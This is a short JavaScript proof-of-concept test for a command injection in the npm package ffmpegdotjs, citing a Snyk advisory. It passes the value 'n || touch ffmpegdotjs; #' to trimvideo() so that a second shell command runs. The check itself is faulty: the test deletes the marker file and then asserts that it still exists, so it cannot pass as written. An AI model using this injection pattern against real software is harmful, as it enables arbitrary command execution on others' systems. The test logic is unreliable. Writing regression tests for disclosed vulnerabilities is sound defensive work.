//https://snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542
test("Command Injection in ffmpegdotjs", () => {
  let ffmpegdotjs = require("ffmpegdotjs");
  const fs = require("fs");
  const path = "./ffmpegdotjs";
  const sleep = require("sleep");
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ffmpegdotjs.trimvideo(
    "package-lock.json",
    0,
    30,
    "n || touch ffmpegdotjs; #"
  );
  sleep.sleep(5);
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
